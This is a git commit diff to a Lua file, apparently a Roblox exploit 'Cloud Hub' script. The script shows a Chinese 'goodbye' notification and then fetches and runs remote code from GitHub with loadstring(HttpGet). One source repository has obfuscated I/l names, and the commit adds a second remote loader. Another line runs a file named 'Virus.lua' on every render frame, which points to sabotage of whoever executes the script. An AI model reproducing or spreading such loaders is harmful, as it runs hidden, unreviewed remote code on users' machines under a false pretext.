edbc7ec7cacfabf550b316ab834fa3607dd37e40
小云 <130466576+XiaoYunCN@users.noreply.github.com>
2024-06-12 01:00:31 +0800

    更新 云中心CLOUD-HUB.lua

--- 云中心CLOUD-HUB.lua
+++ 云中心CLOUD-HUB.lua
@@ -4,6 +4,6 @@ CoreGui:SetCore("SendNotification", {
     Text = "再见，我不玩roblox注入器",
     Duration = 10
 })
-loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIIIIIIIIIIIIIIIIllll/IIIlllllIIIIIIlllllllllllllllllllllllllllllllllllllllllIIllIIIlllllIIIIIIl/main/aanhhz%3B%24%3B%40(%40/%24%3B%22-%23)!%40/92%2B%40()1!8%40)/sb.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIIIIIIIIIIIIIIIIllll/IIIlllllIIIIIIlllllllllllllllllllllllllllllllllllllllllIIllIIIlllllIIIIIIl/main/aanhhz%3B%24%3B%40(%40/%24%3B%22-%23)!%40/92%2B%40()1!8%40)/sb.lua", true))();loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudX-ScriptsWane/White-ash-script/main/b.lua", true))()
 game:GetService("RunService").RenderStepped:Connect(function()  loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/Virus.lua"))()
 end)
